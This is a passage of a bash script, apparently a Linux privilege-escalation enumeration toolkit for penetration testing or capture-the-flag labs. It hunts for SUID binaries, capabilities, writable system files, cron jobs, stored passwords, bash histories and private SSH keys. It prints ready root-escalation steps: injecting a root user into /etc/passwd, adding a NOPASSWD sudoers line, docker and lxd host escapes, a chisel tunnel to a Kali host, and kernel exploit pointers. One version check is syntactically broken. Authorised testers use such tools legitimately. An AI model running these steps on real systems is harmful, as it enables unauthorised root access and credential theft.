            if [[ "$binary_name" == "$keyword" ]] || [[ "$binary_name" == *"$keyword"* ]]; then
                echo -e "  \033[1;31m[!] $binary\033[0m → https://gtfobins.github.io/gtfobins/$keyword/#suid"
                interesting=1
                break
            fi
        done
        [ $interesting -eq 0 ] && echo "  $binary"
    done
    
    echo ""
    echo "Check custom/unknown SUID binaries with: strings <binary> | less"
}

#------------------------------------------
#  SETGID Programs
#------------------------------------------
function priv.setgid {
    local keywords=("vim" "vi" "find" "bash" "more" "less" "nano" "awk" "python" "perl")
    
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              ⚙️ SGID BINARIES                                  ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    local setgids=$(find / -perm -2000 -type f ! -path "/dev/*" ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null)
    
    if [ -z "$setgids" ]; then
        echo "[!] No SGID binaries found"
        return
    fi
    
    echo "$setgids" | while IFS= read -r binary; do
        local binary_name=$(basename "$binary")
        local interesting=0
        for keyword in "${keywords[@]}"; do
            if [[ "$binary_name" == *"$keyword"* ]]; then
                echo -e "  \033[1;33m[!] $binary\033[0m"
                interesting=1
                break
            fi
        done
        [ $interesting -eq 0 ] && echo "  $binary"
    done
}

#------------------------------------------
#  Capabilities
#------------------------------------------
function priv.capabilities {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              🎯 CAPABILITIES                                   ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    if ! command -v getcap >/dev/null 2>&1; then
        echo "[!] getcap not available"
        return
    fi
    
    local caps=$(getcap -r / 2>/dev/null)
    
    if [ -z "$caps" ]; then
        echo "[*] No interesting capabilities found"
        return
    fi
    
    echo "$caps" | while IFS= read -r line; do
        if echo "$line" | grep -qiE "cap_setuid|cap_setgid|cap_dac_override|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace|cap_net_raw|cap_net_admin"; then
            echo -e "  \033[1;31m[!] $line\033[0m"
        else
            echo "  $line"
        fi
    done
    
    echo ""
    echo "Interesting capabilities:"
    echo "  cap_setuid → Can become root"
    echo "  cap_dac_read_search → Can read any file (tar)"
    echo "  cap_sys_admin → Various exploits possible"
    echo ""
    echo "Reference: https://gtfobins.github.io/#+capabilities"
}

#------------------------------------------
#  Writable Directories - IMPROVED
#------------------------------------------
function priv.writable {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              📝 WRITABLE LOCATIONS                            ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    # Critical files check
    echo "=== Critical Files Check ==="
    
    if [ -w /etc/passwd ]; then
        echo -e "  \033[1;31m[!!!] /etc/passwd is WRITABLE - INSTANT ROOT!\033[0m"
        echo "       Run: openssl passwd -1 password"
        echo "       Add: hacker:\$1\$xyz...:0:0:root:/root:/bin/bash"
        echo ""
    fi
    
    if [ -r /etc/shadow ]; then
        echo -e "  \033[1;31m[!!!] /etc/shadow is READABLE!\033[0m"
        echo "       Crack hashes with: john --wordlist=rockyou.txt shadow.txt"
        echo ""
    fi
    
    if [ -w /etc/shadow ]; then
        echo -e "  \033[1;31m[!!!] /etc/shadow is WRITABLE!\033[0m"
        echo ""
    fi
    
    if [ -w /etc/sudoers ]; then
        echo -e "  \033[1;31m[!!!] /etc/sudoers is WRITABLE!\033[0m"
        echo '       Add: echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers'
        echo ""
    fi
    
    echo "=== Writable Directories (excluding /tmp, /dev, /proc, /run) ==="
    find / -maxdepth 5 -writable -type d \
        ! -path "/proc/*" ! -path "/dev/*" ! -path "/run/*" \
        ! -path "/sys/*" ! -path "/tmp/*" ! -path "/var/tmp/*" \
        2>/dev/null | head -50
    
    echo ""
    echo "=== Writable Files in /etc ==="
    find /etc -writable -type f 2>/dev/null | head -20
    
    echo ""
    echo "=== Writable Files in /opt, /var/www, /srv ==="
    find /opt /var/www /srv -writable -type f 2>/dev/null | head -20
}

#------------------------------------------
#  Cron Jobs
#------------------------------------------
function priv.crontabs {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              ⏰ CRON JOBS                                      ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    echo "=== /etc/crontab ==="
    cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$"
    
    echo ""
    echo "=== Cron Directories ==="
    for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
        if [ -d "$dir" ]; then
            echo "[$dir]"
            ls -la "$dir" 2>/dev/null | grep -v "^total"
        fi
    done
    
    echo ""
    echo "=== Cron Files Content ==="
    for f in /etc/cron.d/*; do
        if [ -f "$f" ] && [ -r "$f" ]; then
            echo "--- $f ---"
            cat "$f" 2>/dev/null | grep -v "^#" | grep -v "^$" | head -5
        fi
    done
    
    echo ""
    echo "=== User Crontabs ==="
    for user in $(cut -f1 -d: /etc/passwd 2>/dev/null); do 
        local cron=$(crontab -u $user -l 2>/dev/null | grep -v "^#" | grep -v "^$")
        if [ -n "$cron" ]; then
            echo "[User: $user]"
            echo "$cron"
        fi
    done
    
    echo ""
    echo "=== /var/spool/cron/crontabs ==="
    ls -la /var/spool/cron/crontabs/ 2>/dev/null
    cat /var/spool/cron/crontabs/* 2>/dev/null
    
    echo ""
    echo "=== Recent CRON in syslog ==="
    grep "CRON" /var/log/syslog 2>/dev/null | tail -n 15
    grep "CRON" /var/log/cron.log 2>/dev/null | tail -n 15
    
    echo ""
    echo "=== Writable Scripts in Cron ==="
    for f in $(grep -rh "/" /etc/cron* 2>/dev/null | grep -oE "(/[a-zA-Z0-9_/.-]+)" | sort -u); do
        if [ -w "$f" ] 2>/dev/null; then
            echo -e "  \033[1;31m[!] WRITABLE: $f\033[0m"
        fi
    done
    
    echo ""
    echo "Look for:"
    echo "  - Writable scripts being executed"
    echo "  - Commands without absolute path (PATH hijacking)"
    echo "  - Wildcard usage with tar/rsync (wildcard injection)"
    echo ""
    echo "TIP: Use 'recon.pspy' to monitor cron jobs in real-time"
}

#------------------------------------------
#  Interesting Files
#------------------------------------------
function priv.interesting() {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              📁 INTERESTING FILES                             ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    echo "=== Configuration Files with Passwords ==="
    local config_patterns="wp-config.php config.php database.yml .env settings.py local_settings.py db.php connection.php"
    for pattern in $config_patterns; do
        find / -name "$pattern" -type f 2>/dev/null | while read f; do
            echo -e "  \033[1;32m[+] $f\033[0m"
        done
    done
    
    echo ""
    echo "=== .env Files ==="
    find / -name ".env" -type f 2>/dev/null | head -20
    find / -name "*.env" -type f 2>/dev/null | head -10
    
    echo ""
    echo "=== Bash History (readable) ==="
    for hist in /home/*/.bash_history /root/.bash_history; do
        if [ -r "$hist" ] 2>/dev/null; then
            echo -e "  \033[1;32m[+] Readable: $hist\033[0m"
            echo "      Last 5 commands:"
            tail -5 "$hist" 2>/dev/null | sed 's/^/        /'
        fi
    done
    
    echo ""
    echo "=== MySQL History ==="
    for hist in /home/*/.mysql_history /root/.mysql_history; do
        if [ -r "$hist" ] 2>/dev/null; then
            echo -e "  \033[1;32m[+] Readable: $hist\033[0m"
        fi
    done
    
    echo ""
    echo "=== Backup Files ==="
    find / \( -name "*.bak" -o -name "*.old" -o -name "*backup*" -o -name "*.orig" \) -type f 2>/dev/null | grep -vE "proc|sys" | head -20
    
    echo ""
    echo "=== Database Files ==="
    find / \( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \) -type f 2>/dev/null | grep -vE "proc|sys|firefox|chrome|snap" | head -15
    
    echo ""
    echo "=== Log Files with Passwords ==="
    grep -rli "password" /var/log/ 2>/dev/null | head -10
    
    echo ""
    echo "=== Files with 'password' in /opt, /var/www, /home ==="
    grep -rli "password" /opt /var/www /home /srv 2>/dev/null | head -20
    
    echo ""
    echo "=== PEM/Key Files ==="
    find / \( -name "*.pem" -o -name "*.key" -o -name "*.crt" \) -type f 2>/dev/null | grep -vE "proc|sys|ssl/certs" | head -15
}

#------------------------------------------
#  Password Files
#------------------------------------------
function priv.passwords() {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              🔐 PASSWORD FILES                                ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    echo "=== Critical File Permissions ==="
    ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
    
    echo ""
    echo "=== Readable Sensitive Files ==="
    for file in /etc/shadow ~/.bash_history ~/.mysql_history ~/.ssh/id_rsa /var/backups/passwd.bak /var/backups/shadow.bak; do
        if [ -r "$file" ] 2>/dev/null; then
            echo -e "  \033[1;31m[+] READABLE: $file\033[0m"
        fi
    done
    
    echo ""
    echo "=== Password in Config Files ==="
    grep -riE "password|passwd|pwd|credentials" /etc/ 2>/dev/null | grep -viE "^#|comment|example|documentation" | head -20
    
    echo ""
    echo "=== Web Config Files ==="
    for dir in /var/www /srv/www /opt; do
        if [ -d "$dir" ]; then
            grep -riE "password|passwd|db_pass|mysql" "$dir" 2>/dev/null | grep -viE "^#|comment" | head -10
        fi
    done
}

#------------------------------------------
#  SSH Keys
#------------------------------------------
function priv.sshkeys() {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              🔑 SSH KEYS                                       ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    echo "=== Private Keys ==="
    find / \( -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" \) -type f 2>/dev/null | while read key; do
        if [ -r "$key" ]; then
            echo -e "  \033[1;31m[+] READABLE: $key\033[0m"
        else
            echo "  [!] Found but not readable: $key"
        fi
    done
    
    echo ""
    echo "=== Authorized Keys (writable = persistence) ==="
    find / -name "authorized_keys" -type f 2>/dev/null | while read key; do
        if [ -w "$key" ]; then
            echo -e "  \033[1;33m[+] WRITABLE: $key\033[0m"
        elif [ -r "$key" ]; then
            echo "  [+] Readable: $key"
        fi
    done
    
    echo ""
    echo "=== SSH Config ==="
    cat /etc/ssh/sshd_config 2>/dev/null | grep -iE "permitroot|passwordauth|pubkey" | grep -v "^#"
    
    echo ""
    echo "=== Known Hosts ==="
    for f in /home/*/.ssh/known_hosts /root/.ssh/known_hosts; do
        if [ -r "$f" ] 2>/dev/null; then
            echo "[+] $f:"
            cat "$f" 2>/dev/null | head -5
        fi
    done
}

#------------------------------------------
#  Writable Systemd Services
#------------------------------------------
function priv.services() {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              🔧 SYSTEMD SERVICES                               ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    echo "=== Writable Service Files ==="
    find /etc/systemd/system /usr/lib/systemd/system -writable -type f -name "*.service" 2>/dev/null | while read svc; do
        echo -e "  \033[1;31m[!!!] WRITABLE: $svc\033[0m"
    done
    
    echo ""
    echo "=== Services Running as Root ==="
    systemctl list-units --type=service --state=running 2>/dev/null | head -20
    
    echo ""
    echo "=== Services without User= (run as root) ==="
    for svc in /etc/systemd/system/*.service; do
        if [ -r "$svc" ] && ! grep -q "^User=" "$svc" 2>/dev/null; then
            if grep -q "^ExecStart=" "$svc" 2>/dev/null; then
                echo "  [*] $svc (no User= specified)"
            fi
        fi
    done 2>/dev/null | head -10
    
    echo ""
    echo "If writable:"
    echo "  1. Modify ExecStart= to run your payload"
    echo "  2. sudo systemctl daemon-reload (if allowed)"
    echo "  3. sudo systemctl restart <service> or reboot"
    echo ""
    echo "⚠️ IMPORTANT: ExecStart requires ABSOLUTE PATHS!"
}

priv.container() {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║ 🐳 CONTAINER & GROUP DETECTION ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""

    # Run 'id' only once – fixes hanging on LDAP/NIS systems
    id_output=$(id 2>/dev/null || echo "id command failed")

    echo "=== Current User Groups ==="
    echo "$id_output"
    echo ""

    # Docker group
    if echo "$id_output" | grep -q '\bdocker\b'; then
        echo -e "\033[1;31m[!!!] USER IS IN DOCKER GROUP - EASY ROOT!\033[0m"
        echo ""
        echo "Escape command:"
        echo " docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
        echo ""
        echo "Or with existing image:"
        echo " docker images"
        echo " docker run -v /:/mnt --rm -it <image> chroot /mnt sh"
        echo ""
    fi

    # LXD/LXC group
    if echo "$id_output" | grep -qE '\b(lxd|lxc)\b'; then
        echo -e "\033[1;31m[!!!] USER IS IN LXD/LXC GROUP - EASY ROOT!\033[0m"
        echo ""
        echo "Escape steps:"
        echo " 1. lxc image import alpine*.tar.gz --alias myimage"
        echo " 2. lxc init myimage privesc -c security.privileged=true"
        echo " 3. lxc config device add privesc host disk source=/ path=/mnt recursive=true"
        echo " 4. lxc start privesc"
        echo " 5. lxc exec privesc -- sh"
        echo " 6. cd /mnt/root && id"
        echo ""
    fi

    # Disk group
    if echo "$id_output" | grep -q '\bdisk\b'; then
        echo -e "\033[1;33m[!] USER IS IN DISK GROUP\033[0m"
        echo " → debugfs /dev/sda  (read raw disk)"
        echo ""
    fi

    # Adm group
    if echo "$id_output" | grep -q '\badm\b'; then
        echo -e "\033[1;33m[!] USER IS IN ADM GROUP\033[0m"
        echo " → Can read /var/log/*"
        echo ""
    fi

    echo "=== Container Detection ==="

    [ -f /.dockerenv ] && echo -e "\033[1;33m[!] Running inside Docker container (.dockerenv)\033[0m"
    grep -q docker /proc/1/cgroup 2>/dev/null && echo -e "\033[1;33m[!] Running inside Docker (cgroup)\033[0m"
    grep -q lxc    /proc/1/cgroup 2>/dev/null && echo -e "\033[1;33m[!] Running inside LXC container\033[0m"

    if ! head -1 /proc/1/sched 2>/dev/null | grep -q init; then
        echo "[*] Possibly in a container (PID 1 is not init/systemd)"
    fi

    echo ""
    echo "=== Docker Socket ==="
    if [ -S /var/run/docker.sock ]; then
        echo -e "\033[1;31m[!] Docker socket exists: /var/run/docker.sock\033[0m"
        if [ -w /var/run/docker.sock ]; then
            echo -e "\033[1;31m[!!!] Docker socket is WRITABLE → Instant root!\033[0m"
            echo " → docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
        fi
    else
        echo "No docker socket found"
    fi

    echo ""
}

# Uncomment to run directly
# priv.container

#------------------------------------------
#  Internal Services (127.0.0.1 only)
#------------------------------------------
function priv.internal() {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║              🌐 INTERNAL SERVICES (127.0.0.1)                  ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    
    echo "=== Services Listening on localhost only ==="
    if command -v ss >/dev/null 2>&1; then
        ss -tulnp 2>/dev/null | grep "127.0.0.1"
    elif command -v netstat >/dev/null 2>&1; then
        netstat -tulnp 2>/dev/null | grep "127.0.0.1"
    fi
    
    echo ""
    echo "=== All Listening Services ==="
    if command -v ss >/dev/null 2>&1; then
        ss -tulnp 2>/dev/null
    elif command -v netstat >/dev/null 2>&1; then
        netstat -tulnp 2>/dev/null
    fi
    
    echo ""
    echo "Common internal services to check:"
    echo "  - 3306 MySQL"
    echo "  - 5432 PostgreSQL"
    echo "  - 6379 Redis"
    echo "  - 27017 MongoDB"
    echo "  - 8080/9000 Web apps"
    echo ""
    echo "Forward with:"
    echo "  SSH: ssh -L 8080:127.0.0.1:8080 user@target"
    echo "  Chisel: ./chisel client KALI:8000 R:8080:127.0.0.1:8080"
}

#------------------------------------------
#  Kernel Version & Exploit Hints
#------------------------------------------

priv.kernel() {
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║ 📦 KERNEL & EXPLOIT HINTS ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""

    echo "=== Kernel Information ==="
    uname -r | tr -d '\n' && echo "   ($(uname -m))"

    # Safe non-blocking read of /proc/version
    if timeout 3 dd if=/proc/version bs=1024 count=1 2>/dev/null; then
        true
    else
        echo "    /proc/version not readable or blocked"
    fi

    kernel=$(uname -r)
    ver=$(echo "$kernel" | cut -d'-' -f1)
    maj=$(echo "$ver" | cut -d. -f1)
    min=$(echo "$ver" | cut -d. -f2)

    echo ""
    echo "=== Potential Kernel Exploits ==="

    [ -u /usr/bin/pkexec ] && echo -e "\033[1;31m[!] pkexec SUID → PwnKit (CVE-2021-4034)\033[0m"

    ( [ "$maj" -eq 5 ] && [ "$min" -ge 8 ] ) || [ "$maj" -gt 5 ] ] && echo -e "\033[1;31m[!] Kernel ≥ 5.8 → DirtyPipe (CVE-2022-0847)\033[0m"

    timeout 3 sudo -V 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+[a-z]?' | while read v; do
        [ -n "$v" ] && echo "[*] sudo $v → check Baron Samedit if < 1.9.5p2"
    done

    ( [ "$maj" -lt 4 ] || ( [ "$maj" -eq 4 ] && [ "$min" -lt 9 ] ) ) && echo -e "\033[1;31m[!] Kernel < 4.9 → Dirty COW (CVE-2016-5195)\033[0m"

    echo ""
    echo "searchsploit linux kernel $ver   # on your box"
}

#------------------------------------------
#  Banner
#------------------------------------------
function banner {
    echo "

     ___  __    ___   ___                                      
    /___\/ _\  / __\ / _ \  _ __ ___  ___ ___  _ __            
   //  //\ \  / /   / /_)/ | '__/ _ \/ __/ _ \| '_ \           
  / \_// _\ \/ /___/ ___/  | | |  __/ (_| (_) | | | |          
  \___/  \__/\____/\/      |_|  \___|\___\___/|_| |_|          
                                                     
 ============================================================
  Linux PrivEsc Methodology v2.0               DannyDB@~>
 "
}

check_ip_kali() {
    if [[ "$IP_KALI" =~ "IP_KALI" ]]; then
        clear
        echo ""
        echo -n " [>] Please enter the IP address for Kali: "
        read IP_KALI
        export IP_KALI
        echo ""
    fi
}

# Basic aliases for initial load
alias ll='ls -lh --group-dirs=first --color=auto 2>/dev/null || ls -lh' 2>/dev/null

# Main execution
check_ip_kali
recon.help
